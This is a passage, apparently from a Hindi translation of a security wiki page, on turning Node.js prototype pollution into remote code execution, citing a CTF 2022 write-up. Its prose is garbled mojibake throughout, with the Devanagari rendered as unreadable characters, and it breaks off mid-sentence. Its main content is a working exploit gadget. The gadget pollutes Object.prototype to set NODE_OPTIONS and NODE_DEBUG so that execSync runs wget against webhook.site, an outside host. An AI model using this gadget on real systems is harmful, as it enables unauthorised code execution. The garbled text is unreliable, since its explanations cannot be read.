рдкрд┐рдЫрд▓реЗ рд╡рд╛рд▓реЗ рдХреЗ рд╕рдорд╛рди, рдпрд╣ [**рдЗрд╕ рд▓реЗрдЦ**](https://blog.huli.tw/2022/12/26/en/ctf-2022-web-js-summary/#balsn-ctf-2022-2linenodejs) рдореЗрдВ рдкрд╛рдпрд╛ рдЧрдпрд╛ред

```javascript
// Requiring /opt/yarn-v1.22.19/preinstall.js
Object.prototype["data"] = {
exports: {
".": "./preinstall.js"
},
name: './usage'
}
Object.prototype["path"] = '/opt/yarn-v1.22.19'
Object.prototype.shell = "node"
Object.prototype["npm_config_global"] = 1
Object.prototype.env = {
"NODE_DEBUG": "console.log(require('child_process').execSync('wget${IFS}https://webhook.site?q=2').toString());process.exit()//",
"NODE_OPTIONS": "--require=/proc/self/environ"
}

require('./usage.js')
```

## VM рдЧреИрдЬреЗрдЯреНрд╕

рдкреЗрдкрд░ [https://arxiv.org/pdf/2207.11171.pdf](https://arxiv.org/pdf/2207.11171.pdf) рдореЗрдВ рдЗрд╕рдХрд╛ рднреА рдЙрд▓реНрд▓реЗрдЦ рд╣реИ рдХрд┐ **`vm`** рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЗ рдХреБрдЫ рдореЗрдердбреНрд╕ рд╕реЗ **`contextExtensions`** рдХрд╛ рдирд┐рдпрдВрддреНрд░рдг рдПрдХ рдЧреИрдЬреЗрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдкрд┐рдЫрд▓реЗ **`child_process`** рдореЗрдердбреНрд╕ рдХреА рддрд░рд╣, рдЗрд╕реЗ рдирд╡реАрди рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ **рд╕реБрдзрд╛рд░** рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

## рд╕реБрдзрд╛рд░ рдФрд░ рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рд╕реБрд░рдХреНрд╖рд╛

рдХреГрдкрдпрд╛ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрдпреВрд╢рди рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдЕрдЧрд░ рдПрдХ рдСрдмреНрдЬ
